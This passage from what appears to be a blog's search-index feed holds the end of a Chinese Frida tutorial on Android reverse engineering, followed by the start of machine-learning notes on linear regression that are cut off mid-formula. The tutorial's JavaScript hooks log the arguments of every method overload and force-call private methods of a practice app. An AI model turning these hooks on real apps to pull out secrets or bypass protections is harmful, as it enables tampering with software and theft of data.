class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;<span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>.<span class="property">length</span>;k++)&#123;</span><br><span class="line">                <span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（8）主动调用">（8）主动调用</h3><ul><li>静态方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ClassName</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line"><span class="title class_">ClassName</span>.<span class="title function_">privateFunc</span>(<span class="string">&quot;传参&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>非静态方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//要hook的类</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            ret=instance.<span class="title function_">privateFunc</span>(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//要hook的方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br></pre></td></tr></table></figure><h2 id="五、Java层的主动调用">五、Java层的主动调用</h2><p><strong>主动调用</strong>就是强制调用一个函数去执行。相对地，<strong>被动调用</strong>是由App按照正常逻辑去执行函数，函数的执行完全依靠与用户交互完成程序逻辑进而间接调用到关键函数，而主动调用则可以直接调用关键函数，主动性更强，甚至可以直接完成关键数据的“自吐”。</p><p>在<code>Java</code>中，类中的函数可以分为两种：<strong>类函数和实例方法</strong>。通俗的讲，就是<strong>静态方法和动态方法</strong>。</p><p><strong>类函数</strong>使用关键字<code>static</code>修饰，和对应类是绑定的，如果类函数还被<code>public</code>关键字修饰着，在外部就可以直接通过类去调用。</p><p>实例方法则没有关键字<code>static</code>修饰，在外部<strong>只能通过创建对应类的实例</strong>再通过这个实例去调用。</p><blockquote><p>在<code>Frida</code>中主动调用的类型会根据方法类型区分开。如果是类函数的主动调用，直接使用<code>Java.use()</code>函数找到对应的实例后对方法进行调用。如果是实例方法的主动调用，则需要在找到对应的实例后对方法进行调用。这里用到了<code>Frida</code>中非常重要的一个<code>API</code>函数<code>Java.choose()</code>，这个函数可以在<code>Java</code>的堆中寻找指定类的实例。</p></blockquote><p>示例代码<code>MainActivity.java</code>：</p><p><img src="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/image-20250315211933929.png" alt="image-20250315211933929"></p><p><code>Hook</code>函数的代码如下<code>hook.js</code>：</p><p><img src="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/image-20250315212408313.png" alt="image-20250315212408313"></p><p>从<code>hook.js</code>这个脚本中，可以发现静态的<code>staticSecret()</code>函数和<code>Hook</code>时使用的方式大同小异，都是使用<code>Java.use</code>这个<code>API</code>去获取<code>MainActivity</code>类，在获取对应的类对象后通过&quot;.&quot;连接符连接<code>staticSecret</code>方法名，最终以和<code>Java</code>中一样的方式直接调用静态方法<code>staticSecret()</code>函数。</p><p>动态方法<code>secret</code>需要先通过<code>Java.choose</code>这个<code>API</code>从内存中获取相应类的实例对象，然后才能通过这个实例对象去调用动态的<code>secret()</code>函数。</p><blockquote><p>如果需要主动调用动态函数，必须确保存在相应类的对象，否则无法进入<code>Java.choose</code>这个<code>API</code>的回调<code>onMatch</code>逻辑中。比如<code>MainActivity</code>类对象，由于<code>App</code>在打开后确实运行在<code>MainActivity</code>界面上，那么这个对象就一定会存在，这就是所谓的“所见即所得”思想。</p></blockquote><h2 id="参考">参考</h2><p><a href="https://www.52pojie.cn/thread-1823118-1-1.html">https://www.52pojie.cn/thread-1823118-1-1.html</a></p><p>《安卓Frida逆向与抓包实战》 陈佳林/著</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> 安卓逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记</title>
      <link href="/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="机器学习">机器学习</h2><p>机器学习（Machine Learning）是人工智能的一个分支，简单来说，它让计算机通过数据自己“学习”规律并做出预测或决策，而不需要人类明确地编写每一步规则。它有点像教小孩认识世界：你给它很多例子，它通过观察和总结找出模式，以后遇到类似情况就能自己判断。</p><p>具体点，机器学习的核心是用算法从数据中提取特征、建立模型，然后用这个模型去解决实际问题。比如，你想让机器识别手写数字，可以给它看几千张写着0到9的图片，告诉它每个是什么（或者不告诉，让它自己分组），它就会慢慢学会分辨。</p><p>机器学习主要分三种类型：<strong>监督学习</strong>（有标签数据，像教答案）、<strong>无监督学习</strong>（无标签，自己找规律）和<strong>强化学习</strong>（通过试错学怎么做最好）。</p><p>它在生活中无处不在，比如推荐你喜欢的电影、过滤垃圾邮件、自动驾驶识别路况，甚至帮医生看X光片。关键在于，它靠的是数据和算法，而不是传统的“如果这样就那样”的硬编码规则。所以数据越多、算法越聪明，它就越厉害。</p><h2 id="监督学习和无监督学习">监督学习和无监督学习</h2><p>监督学习和无监督学习是两种最基本的方法，它们的主要区别在于<strong>数据是否带有标签</strong></p><h3 id="监督学习">监督学习</h3><p>监督学习（Supervised Learning）就像有一个老师在旁边指导。它的核心是<strong>用已经标记好的数据来训练模型</strong>，也就是说，<strong>数据里不仅有输入（特征），还有对应的正确输出（标签）</strong>。比如，你要教模型识别猫狗的图片，训练数据里每张图片都会标注“这是猫”或“这是狗”。模型通过学习这些例子，找到输入和输出之间的规律，以后看到新图片就能自己判断是猫还是狗。常见的监督学习任务包括<strong>分类()</strong>（比如判断邮件是不是垃圾邮件）和<strong>回归()</strong>（比如预测房价）</p><h3 id="无监督学习">无监督学习</h3><p>无监督学习（Unsupervised Learning）则没有这个“老师”。<strong>数据只有输入，没有预先给出的标签，模型得自己去挖掘数据的内在结构或模式</strong>。比如，你给一堆图片，模型可能会自己把它们分成几类，比如“看起来像动物的”和“看起来像风景的”，但它不知道这些类具体叫什么。无监督学习常用来做<strong>聚类(Clustering)</strong>（把相似的东西分一组）、<strong>降维(Dimensionality reduction)</strong>（把复杂数据简化但保留关键信息）或者<strong>异常检测(Anomaly detection)</strong>（发现异常的数据点），比如分析用户行为、压缩数据和金融系统中的欺诈检测。</p><h2 id="线性回归模型-Linear-Regression">线性回归模型(Linear Regression)</h2><p><strong>线性回归</strong>是监督学习中最基础的回归模型，旨在建立输入特征（X）与连续型目标变量（y）之间的<strong>线性关系</strong>。其核心假设是：目标值可以通过特征的<strong>加权求和</strong>加上一个常数项（截距）来预测。</p><h3 id="模型方程">模型方程</h3><p><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="35.24ex" height="2.059ex" role="img" focusable="false" viewbox="0 -705 15576.2 910" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1823.6,0)"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(2951.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3951.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(4857.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6087.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7088.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7993.7,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(9002.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9780.2,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10224.9,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10669.5,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11114.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(11892.2,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(12868.5,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(14170,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(15170.2,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>y</mi><mo>=</mo><msub><mi>θ</mi><mn>0</mn></msub><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>θ</mi><mn>1</mn></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mn>1</mn></msub></mrow><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>θ</mi><mn>2</mn></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mn>2</mn></msub></mrow><mo>+</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>+</mo><mrow data-mjx-texclass="ORD"><msub><mi>θ</mi><mi>n</mi></msub></mrow><mrow data-mjx-texclass="ORD"><msub><mi>x</mi><mi>n</mi></msub></mrow><mo>+</mo><mi>ϵ</mi></math></mjx-assistive-mml></mjx-container></p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>y</mi></math></mjx-assistive-mml></mjx-container> ：预测目标值</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="2.049ex" height="1.97ex" role="img" focusable="false" viewbox="0 -705 905.6 870.6" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>θ</mi><mn>0</mn></msub></math></mjx-assistive-mml></mjx-container>：截距（bias term）</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="5.389ex" height="1.952ex" role="img" focusable="false" viewbox="0 -705 2381.8 862.8" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mtext" transform="translate(905.6,0)"><path data-c="7E" d="M179 251Q164 251 151 245T131 234T111 215L97 227L83 238Q83 239 95 253T121 283T142 304Q165 318 187 318T253 300T320 282Q335 282 348 288T368 299T388 318L402 306L416 295Q375 236 344 222Q330 215 313 215Q292 215 248 233T179 251Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1405.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 